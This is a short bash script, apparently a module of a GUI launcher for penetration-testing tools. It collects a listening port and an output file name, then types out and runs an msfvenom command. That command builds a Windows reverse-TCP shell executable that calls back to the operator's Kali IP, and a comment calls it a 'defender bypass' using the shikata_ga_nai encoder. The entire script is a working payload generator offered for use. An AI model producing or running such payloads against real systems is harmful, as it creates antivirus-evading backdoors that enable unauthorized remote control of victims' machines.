#!/bin/bash

: '
defender bypass with x86/shikata_ga_nai for .exe
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
LPORT_FIELD=$(form_item  "LPORT" "number" "lport" "1337")
OUTPUT_FILE_FIELD=$(form_item  "output file" "text" "output_file" "shell.exe")

# Generate GUI form
generate_form "${LPORT_FIELD}""${OUTPUT_FILE_FIELD}"

LPORT=${form_data["lport"]}
OUTPUT_FILE=${form_data["output_file"]}

paste_command "msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=${KALI_IP} LPORT=${LPORT} -b "\x00" -e x86/shikata_ga_nai -f exe -o ${OUTPUT_FILE}"
xdotool key Return